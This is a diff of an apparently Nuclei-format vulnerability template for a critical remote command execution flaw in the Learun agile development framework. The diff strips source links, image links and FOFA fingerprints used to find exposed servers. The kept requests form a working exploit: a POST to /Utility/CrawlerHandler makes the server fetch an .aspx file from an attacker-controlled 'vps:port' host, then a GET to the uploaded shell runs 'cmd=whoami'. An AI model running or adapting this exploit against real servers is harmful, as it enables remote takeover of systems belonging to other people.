@@ -3,12 +3,8 @@ info:
   name: 力软信息敏捷开发框架CrawlerHandler存在远程上传导致命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hvo1sepiud5e422x'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hvo1sepiud5e422x
-    fofa: body="Home/AccordionIndex" || body="上海力软信息技术有限公司版权所有" || body="/Content/images/Login/psw1.png"
 http:
 - raw:
   - 'POST /Utility/CrawlerHandler HTTP/1.1
@@ -30,7 +26,6 @@ http:
 
     source[]=http://vps:port/test.jpg?.aspx
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748670817163-d0b5f050-0d6d-406e-a42b-7ee036219ee9.png)
 
     拼接上传后路径访问'
   redirects: false
@@ -41,9 +36,7 @@ http:
 - raw:
   - 'GET /Utility/upload/image/20250520/6388333145146975791150866.aspx?cmd=whoami HTTP/1.1
 
-    Host: {{Hostname}}
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748670817403-65c29108-5e17-43ac-a4a1-b531f15881fa.png)'
+    Host: {{Hostname}}'
   redirects: false
   matchers:
   - status:
